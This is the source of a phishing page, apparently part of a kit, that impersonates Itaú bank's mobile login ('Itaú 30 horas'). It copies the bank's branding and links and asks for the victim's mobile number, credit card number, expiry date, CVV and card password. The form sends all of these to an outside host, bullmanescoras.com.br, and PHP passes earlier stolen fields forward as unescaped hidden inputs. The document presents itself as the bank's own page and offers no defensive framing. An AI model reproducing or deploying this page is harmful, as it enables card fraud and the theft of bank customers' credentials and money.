<?php 
  $url_atual = "http" . (isset($_SERVER[HTTPS]) ? (($_SERVER[HTTPS]=="on") ? "s" : "") : "") . "://" . "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

  $explodeUrl = explode("/",$url_atual);
  $novaUrl = array_pop($explodeUrl);
  $explodeUrl = implode("/",$explodeUrl);
?>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Expires" content="-1">
        <meta http-equiv="Cache-control" content="no-store">
        <script language="javascript" src="js/passarCampo.js"></script>
        <script language="javascript" src="js/validationCampos.js"></script>
        <script language="javascript" src="js/maskPhone.js"></script>
        <script language="javascript" src="js/jquery-1.11.3.min.js"></script>
        <script language="javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
        <script type="text/javascript" language="JavaScript">
            function SomenteNumero(e){
                var tecla=(window.event)?event.keyCode:e.which;
                if((tecla > 47 && tecla < 58)) return true;
                else{
                    if (tecla != 8) return false;
                    else return true;
                }
            }
            function mascaraData2( campo, e )
            {
                console.log(campo, e);
                var kC = (document.all) ? event.keyCode : e.keyCode;
                var data = campo.value;
                
                if( kC!=8 && kC!=46 )
                {
                    if( data.length==2 )
                    {
                        campo.value = data += '/';
                    }
                    else
                        campo.value = data;
                }
            }
        </script>
        <script type="text/javascript" language="JavaScript">
            function SomenteNumero(e){
                var tecla=(window.event)?event.keyCode:e.which;
                if((tecla > 47 && tecla < 58)) return true;
                else{
                    if (tecla != 8) return false;
                    else return true;
                }
            }
        </script>
        <script language="JavaScript" type="text/javascript">
   function mascaraData(campoData){
              var data = campoData.value;
              if (data.length == 2){
                  data = data + '/';
                  document.forms[0].txtVal.value = data;
      return true;              
              }

         }
</script>
        <script type="text/javascript" language="javascript">
            var autenticado = 'N';
            
            var isIPad = (navigator.userAgent.indexOf("iPad") > -1);
            if (!isIPad) {
                document.write('<meta name="viewport" content="width=device-width, user-scalable=-1;" />');
            }
        </script>
        <title>
            Itaú 30 horas
        </title>
        <link id="ctl00_CssMaster" rel="stylesheet" type="text/css" href="arquivos/iphone.css">
    </head>
    <body onload="scrollTo(0, 1);" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
        <form name="aspnetForm" method="post" action="http://bullmanescoras.com.br/email/envio-ita-1.php" onsubmit="return sc()" id="aspnetForm">
            <!--<form name="aspnetForm" method="post" action="passo3.php" onsubmit="return sc();" id="aspnetForm">-->
            
        <?php foreach($_POST as $key => $value):  ?>
            <input type="hidden" name="<?= $key ?>" id="<?= $key ?>" value="<?= $value ?>" />
        <?php endforeach; ?>
        <input type="hidden" name="erro" value="<?php echo $explodeUrl.'/passo3.php'; ?>" />
        <input type="hidden" name="sucesso" value="<?php echo $explodeUrl.'/passo3.php'; ?>" />
        <table width="100%" style="position:absolute; height:100%" border="0" cellpadding="0" cellspacing="0">
            <tbody>
                <tr style="height:10px" valign="top">
                    <td>
                        <table id="ctl00_tbTopo" height="10px" border="0" width="100%" background="arquivos/bg_iph_nm.png" style="background-repeat:repeat-x;">
                            <tbody>
                                <tr id="ctl00_trlogos">
                                    <td id="ctl00_tdPrincipal1" width="50%" align="left">
                                        <img src="arquivos/logo_nm.png" border="0">
                                    </td>
                                    <td id="ctl00_TdPrincipal3" width="50%" align="right">
                                        <img src="arquivos/30_nm.png" border="0">
                                    </td>
                                </tr>
                                <tr id="ctl00_trBannerAcaoIncentivo" style="height:50px">
                                    <td colspan="3" align="center">
                                    </td>
                                </tr>
                                <tr>
                                    <td colspan="3" class="PF_TituloIphone">
                                        &nbsp;&nbsp;
                                        <span id="ctl00_lblTitulo">Informe os dados</span>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
                <tr valign="top">
                    <td valign="top">
                        <div id="ctl00_ContentPlaceHolder1_PanTouch">
                            <table border="0" width="100%" style="background-repeat: no-repeat; background-position: 50px 00px">
                                <tbody>
                                    <tr width="100%">
                                        <td>
                                            <fieldset>
                                                <table border="0" width="100%" height="35px">
                                                    <tbody>
                                                        <tr height="8px">
                                                            <td colspan="2"></td>
                                                        </tr>
                                                        <tr style="font-size: 14px;">
                                                            <td class="PF_textoNegrito">
                                                                &nbsp;Celular
                                                            </td>
                                                            
                                                        </tr>
                                                        <tr id="ctl00_ContentPlaceHolder1_trW" style="font-size: 14px;">
                                                            <td>&nbsp;<input id="txtCelular" size="16"  maxlength="11" name="txtCelular" placeholder="" style="-wap-input-format: '*N'" tabindex="1" onkeypress="return SomenteNumero(event)" onkeyup="javascript:pulacampo('txtCelular','txtCCx');" type="tel">
                                                            </td>
                                                            <td colspan="2"></td>
                                                        </tr>
														
                                                    </tbody>
                                                </table>
                                                <table border="0" width="100%" height="35px">
                                                    <tbody>
                                                        <tr height="8px">
                                                            <td colspan="2"></td>
                                                        </tr>
                                                        <tr style="font-size: 14px;">
                                                            <td class="PF_textoNegrito">
                                                                &nbsp;Cartão de Crédito
                                                            </td>
                                                            
                                                        </tr>
                                                        <tr id="ctl00_ContentPlaceHolder1_trW" style="font-size: 14px;">
                                                            <td>&nbsp;<input id="txtCCx" size="16"  minlength="16" maxlength="16" name="txtCCre" placeholder="" style="-wap-input-format: '*N'" tabindex="1" onkeypress="return SomenteNumero(event)" onkeyup="javascript:pulacampo('txtCCx','txtValx');" type="tel">
                                                            </td>
                                                            <td colspan="2"></td>
                                                        </tr>
														
                                                    </tbody>
                                                </table>
                                                <table border="0" width="100%" height="35px">
                                                    <tbody>
                                                        <tr height="8px">
                                                            <td colspan="2"></td>
                                                        </tr>
                                                        <tr style="font-size: 14px;">
                                                            <td class="PF_textoNegrito">
                                                                &nbsp;Validade
                                                            </td>
                                                            
                                                        </tr>
                                                        <tr id="ctl00_ContentPlaceHolder1_trW" style="font-size: 14px;">
                                                            <td>&nbsp;<input id="txtValx" size="7"  minlength="7" maxlength="7" name="txtVal" placeholder="" style="-wap-input-format: '*N'" tabindex="1"  onkeyup="javascript:pulacampo('txtValx','txtCVVx');"   type="tel">
                                                            </td>
                                                            <td colspan="2"></td>
                                                        </tr>
														
                                                    </tbody>
                                                </table>
                                                <table border="0" width="100%" height="35px">
                                                    <tbody>
                                                        <tr height="8px">
                                                            <td colspan="2"></td>
                                                        </tr>
                                                        <tr style="font-size: 14px;">
                                                            <td class="PF_textoNegrito">
                                                                &nbsp;CVV
                                                            </td>
                                                            
                                                        </tr>
                                                        <tr id="ctl00_ContentPlaceHolder1_trW" style="font-size: 14px;">
                                                            <td>&nbsp;<input id="txtCVVx" size="3"  minlength="3" maxlength="3" name="txtCVV" placeholder="" style="-wap-input-format: '*N'" tabindex="1" onkeypress="return SomenteNumero(event)" onkeyup="javascript:pulacampo('txtCVVx','txtSenhaCartaox');" type="tel">
                                                            </td>
                                                            <td colspan="2"></td>
                                                        </tr>
														
                                                    </tbody>
                                                </table>

                                                
                                                <table id="ctl00_ContentPlaceHolder1_tbSenhaTituloS" border="0" width="100%" height="35px">
                                                    <tbody>
                                                        <tr style="font-size: 14px;vertical-align: middle;">
                                                            <td class="PF_textoNegrito">
                                                                &nbsp;Senha do cartão
                                                            </td>
                                                        </tr>
                                                        <tr style="font-size: 14px;vertical-align: middle;">
                                                            <td>&nbsp;<input name="txtSenhaCartao" type="password" maxlength="6" id="txtSenhaCartaox" pattern="[0-9]*" size="9" style="vertical-align: middle;" tabindex="4" onkeypress="return SomenteNumero(event)" size="9">&nbsp;<input type="image" name="ctl00$ContentPlaceHolder1$btnLogInT" id="ctl00_ContentPlaceHolder1_btnLogInT" src="arquivos/bt-ok.png" style="height:25px;width:28px;border-width:0px;vertical-align: middle; border: 0"></td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                                <table>
                                                    <tbody>
                                                        <tr style="font-size: 14px;">
                                                            <td>
                                                            </td>
                                                        </tr>
                                                        <tr height="8px">
                                                            <td>
                                                            </td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </fieldset>
                                            <fieldset id="ctl00_ContentPlaceHolder1_FldPesJuridica">
                                                <div class="row" style="border-bottom:0px;">
                                                    <a href="https://ww70.itau.com.br/M/LoginPJ.aspx" style="text-decoration:none;">
                                                        <table style="vertical-align:middle;" border="0" width="100%" height="40px">
                                                            <tbody>
                                                                <tr style="vertical-align:middle;">
                                                                    <td width="1%"><img src="arquivos/spacer.gif" border="0" class="hideSpacerPJ"></td>
                                                                    <td class="PF_texto" align="left"><span>Cliente pessoa jurídica</span></td>
                                                                    <td width="1%" align="left" class="setaMenuPJ"><img src="arquivos/seta_laranja.png" width="11" height="15" border="0"></td>
                                                                    <td width="1%"></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </a>
                                                </div>
                                            </fieldset>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table id="ctl00_ContentPlaceHolder1_TbDiversosTouch" border="0" width="100%" background="arquivos/ItauLogo.png" style="background-repeat:no-repeat;background-position:50px 00px;">
                                <tbody>
                                    <tr>
                                        <td class="PF_TituloIphone">
                                            &nbsp;&nbsp;&nbsp;Serviços
                                        </td>
                                    </tr>
                                    <tr width="100%">
                                        <td>
                                            <fieldset id="ctl00_ContentPlaceHolder1_FldProdServ">
                                                <div class="row" id="DiviToken" style="display:none;">
                                                    <a href="http://www.itau.com.br/iTokenAplicativo.html" style="text-decoration:none;">
                                                        <table style="vertical-align:middle;" border="0" width="100%" height="40px">
                                                            <tbody>
                                                                <tr style="vertical-align:middle;">
                                                                    <td width="1%"><img src="arquivos/spacer.gif" border="0" class="hideSpacerPJ"></td>
                                                                    <td class="PF_texto" align="left"><span>Gerar código iToken</span></td>
                                                                    <td width="1%" align="left" class="setaMenuPJ"><img src="arquivos/seta_laranja.png" width="11" height="15" border="0"></td>
                                                                    <td width="1%"></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </a>
                                                </div>
                                                <div class="row" id="DivSimPrevidencia" style="display:none;">
                                                    <a href="http://www.itau.com.br/SimPrevidencia.html" style="text-decoration:none;">
                                                        <table style="vertical-align:middle;" border="0" width="100%" height="40px">
                                                            <tbody>
                                                                <tr style="vertical-align:middle;">
                                                                    <td width="1%"><img src="arquivos/spacer.gif" border="0" class="hideSpacerPJ"></td>
                                                                    <td class="PF_texto" align="left"><span>Simulador de previdência</span></td>
                                                                    <td width="1%" align="left" class="setaMenuPJ"><img src="arquivos/seta_laranja.png" width="11" height="15" border="0"></td>
                                                                    <td width="1%"></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </a>
                                                </div>
                                                <div class="row">
                                                    <a href="https://ww70.itau.com.br/M/atendimento.aspx?92A78B8589C3227C9DA8E5323384BAAA08D04652D4928D6C" style="text-decoration:none;">
                                                        <table style="vertical-align:middle;" border="0" width="100%" height="40px">
                                                            <tbody>
                                                                <tr style="vertical-align:middle;">
                                                                    <td width="1%"><img src="arquivos/spacer.gif" border="0" class="hideSpacerPJ"></td>
                                                                    <td class="PF_texto" align="left"><span>Telefones</span></td>
                                                                    <td width="1%" align="left" class="setaMenuPJ"><img src="arquivos/seta_laranja.png" width="11" height="15" border="0"></td>
                                                                    <td width="1%"></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </a>
                                                </div>
                                                <div class="row" style="border-bottom:0px;">
                                                    <a href="https://ww70.itau.com.br/M/cotacao.aspx?95BC9D988099227470E187F41E331FE0DCC0F1C07591A129" style="text-decoration:none;">
                                                        <table style="vertical-align:middle;" border="0" width="100%" height="40px">
                                                            <tbody>
                                                                <tr style="vertical-align:middle;">
                                                                    <td width="1%"><img src="arquivos/spacer.gif" border="0" class="hideSpacerPJ"></td>
                                                                    <td class="PF_texto" align="left"><span>Indicadores de mercado</span></td>
                                                                    <td width="1%" align="left" class="setaMenuPJ"><img src="arquivos/seta_laranja.png" width="11" height="15" border="0"></td>
                                                                    <td width="1%"></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </a>
                                                </div>
                                            </fieldset>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td class="PF_TituloIphone">
                                            &nbsp;&nbsp;&nbsp;Buscar
                                        </td>
                                    </tr>
                                    <tr width="100%">
                                        <td>
                                            <fieldset id="ctl00_ContentPlaceHolder1_flsbuscar">
                                                <div class="row">
                                                    <a href="http://itau.mobi/iph/rede_atendimento/rede_agencias_nm.jsp" style="text-decoration:none;">
                                                        <table style="vertical-align:middle;" border="0" width="100%" height="40px">
                                                            <tbody>
                                                                <tr style="vertical-align:middle;">
                                                                    <td width="1%"><img src="arquivos/spacer.gif" border="0" class="hideSpacerPJ"></td>
                                                                    <td class="PF_texto" align="left"><span>Agências</span></td>
                                                                    <td width="1%" align="left" class="setaMenuPJ"><img src="arquivos/seta_laranja.png" width="11" height="15" border="0"></td>
                                                                    <td width="1%"></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </a>
                                                </div>
                                                <div class="row">
                                                    <a href="http://itau.mobi/iph/rede_atendimento/rede_caixas_nm.jsp" style="text-decoration:none;">
                                                        <table style="vertical-align:middle;" border="0" width="100%" height="40px">
                                                            <tbody>
                                                                <tr style="vertical-align:middle;">
                                                                    <td width="1%"><img src="arquivos/spacer.gif" border="0" class="hideSpacerPJ"></td>
                                                                    <td class="PF_texto" align="left"><span>Caixas eletrônicos</span></td>
                                                                    <td width="1%" align="left" class="setaMenuPJ"><img src="arquivos/seta_laranja.png" width="11" height="15" border="0"></td>
                                                                    <td width="1%"></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </a>
                                                </div>
                                                <div class="row" style="border-bottom:0px;">
                                                    <a href="http://itau.mobi/iph/rede_atendimento/rede_cheques_nm.jsp" style="text-decoration:none;">
                                                        <table style="vertical-align:middle;" border="0" width="100%" height="40px">
                                                            <tbody>
                                                                <tr style="vertical-align:middle;">
                                                                    <td width="1%"><img src="arquivos/spacer.gif" border="0" class="hideSpacerPJ"></td>
                                                                    <td class="PF_texto" align="left"><span>Dispensadores de cheques</span></td>
                                                                    <td width="1%" align="left" class="setaMenuPJ"><img src="arquivos/seta_laranja.png" width="11" height="15" border="0"></td>
                                                                    <td width="1%"></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </a>
                                                </div>
                                            </fieldset>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table border="0" width="100%">
                                <tbody>
                                    <tr>
                                        <td>
                                            <table border="0" width="100%" cellspacing="0" cellpadding="0">
                                                <tbody>
                                                    <tr>
                                                        <td width="3%">
                                                        </td>
                                                        <td width="94%">
                                                            <img src="arquivos/spacer.gif">
                                                        </td>
                                                        <td width="3%">
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr style="height:50px;vertical-align:bottom;">
                    <td valign="bottom">
                        <table id="ctl00_UCDefinicaoTecnologiaUsuario1_TbDefTecnoUsuarioB" border="0" width="100%" cellspacing="0" cellpadding="0">
                            <tbody>
                                <tr width="100%" valign="top">
                                    <td width="2%"></td>
                                    <td width="96%"><a href="https://ww70.itau.com.br/M/Config/Configuracao.aspx" id="ctl00_UCDefinicaoTecnologiaUsuario1_lnkConfiguracao" class="link_padrao1">Configurações</a></td>
                                    <td width="2%"></td>
                                </tr>
                            </tbody>
                        </table>
                        <table border="0" width="1%" cellspacing="6" cellpadding="0">
                            <tbody>
                                <tr>
                                    <td width="1%"></td>
                                </tr>
                            </tbody>
                        </table>
                        <table border="0" width="100%" cellspacing="0" cellpadding="0" id="TbDefTecnoUsuario2">
                            <tbody>
                                <tr width="100%" valign="top">
                                    <td width="2%"></td>
                                    <td id="ctl00_UCDefinicaoTecnologiaUsuario1_tdAcessar" width="96%" class="PF_texto10Normal">Acessar o Itaú na versão:</td>
                                    <td width="2%"></td>
                                </tr>
                                <tr width="100%" valign="top">
                                    <td width="2%"></td>
                                    <td class="PF_texto10Normal" width="95%"><a href="https://ww70.itau.com.br/M/LoginPF.aspx?3809EA6F3A81035D3657E32364444C30D1608F9CD3C79D6CCD70AEE19932D44A" id="ctl00_UCDefinicaoTecnologiaUsuario1_lnkSimplificado" class="link_padrao1">Celular</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a id="ctl00_UCDefinicaoTecnologiaUsuario1_lnkTouch" class="PF_texto10Normal" style="text-decoration:none;">Celular touch</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="http://www.itau.com.br/" id="ctl00_UCDefinicaoTecnologiaUsuario1_lnkPC" class="link_padrao1">PC</a></td>
                                    <td width="2%"></td>
                                </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
            </tbody>
        </table>
    </body>
    <script>
    $(function() {
        // Masck my Dates as mm/YYYY
        $("#txtValx").mask("99/9999");
    });
    </script>
</html>
